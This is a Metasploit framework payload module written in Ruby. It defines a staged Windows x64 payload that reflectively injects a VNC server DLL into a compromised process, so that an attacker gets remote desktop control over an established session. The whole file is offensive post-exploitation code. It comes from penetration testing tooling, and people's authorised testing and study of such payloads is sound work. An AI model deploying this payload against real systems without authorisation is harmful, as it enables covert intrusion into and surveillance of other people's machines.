##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/windows/x64/reflectivedllinject'
require 'msf/base/sessions/vncinject'
require 'msf/base/sessions/vncinject_options'

###
#
# Injects the VNC server DLL (via Reflective Dll Injection) and runs it over the established connection.
#
###
module MetasploitModule

  include Msf::Payload::Windows::ReflectiveDllInject_x64
  include Msf::Sessions::VncInjectOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows x64 VNC Server (Reflective Injection)',
      'Description'   => 'Inject a VNC Dll via a reflective loader (Windows x64) (staged)',
      'Author'        => [ 'sf' ],
      'Session'       => Msf::Sessions::VncInject ))

  end

  def library_path
    File.join(Msf::Config.data_directory, "vncdll.x64.dll")
  end
end
